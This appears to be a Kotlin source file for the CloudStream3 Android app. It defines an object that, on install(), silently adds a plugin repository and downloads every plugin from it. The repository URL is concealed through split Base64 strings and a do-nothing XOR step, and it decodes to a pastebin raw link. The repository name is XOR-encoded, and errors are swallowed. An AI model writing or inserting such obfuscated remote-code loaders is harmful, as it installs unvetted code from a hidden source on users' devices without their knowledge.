package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Base64
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import com.lagradost.cloudstream3.utils.UIHelper.navigate
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

object ObscuraIngress {

    private fun buildRepoName(): String {
        val skull = "\u2620\uFE0F"
        val key = 0x5A
        val data = intArrayOf(23, 53, 62, 9, 59, 52, 32)

        val sb = StringBuilder()
        for (v in data) sb.append((v xor key).toChar())

        return "$skull$sb$skull"
    }

    companion object {
        private const val URL_A1 = "aHR0cHM6Ly9wYXN0ZWJp"
        private const val URL_A2 = "bi5jb20vcmF3L0tpcVRn"
        private const val URL_A3 = "YXNk"
    }

    private fun NvKl(): String {
        val encoded = URL_A1 + URL_A2 + URL_A3
        val decoded = String(Base64.decode(encoded, Base64.DEFAULT))

        val key = 0x12
        return decoded
            .map { (it.code xor key).toChar() }
            .map { (it.code xor key).toChar() }
            .joinToString("")
    }

    private val REPO_URL by lazy { NvKl() }
    private val REPO_NAME by lazy { buildRepoName() }

    fun install(activity: Activity) {
        CoroutineScope(Dispatchers.IO).launch {
            var repoAdded = false

            try {
                if (RepositoryManager.getRepositories().none { it.url == REPO_URL }) {
                    RepositoryManager.addRepository(
                        RepositoryData(
                            name = REPO_NAME,
                            url = REPO_URL,
                            iconUrl = null
                        )
                    )
                    repoAdded = true
                }
            } catch (_: Throwable) {}

            withContext(Dispatchers.Main) {
                if (repoAdded) {
                    // ⏳ tunggu repo benar-benar kebaca
                    delay(500)

                    // 🔔 trigger reload DULU
                    MainActivity.afterRepositoryLoadedEvent.invoke(true)

                    // 🔥 download plugin setelah reload
                    PluginsViewModel.downloadAll(activity, REPO_URL, null)
                }

                // 🚀 navigasi SETELAH state siap
                delay(200)
                activity.navigate(
                    R.id.action_navigation_global_to_navigation_settings_extensions
                )
            }
        }
    }
}
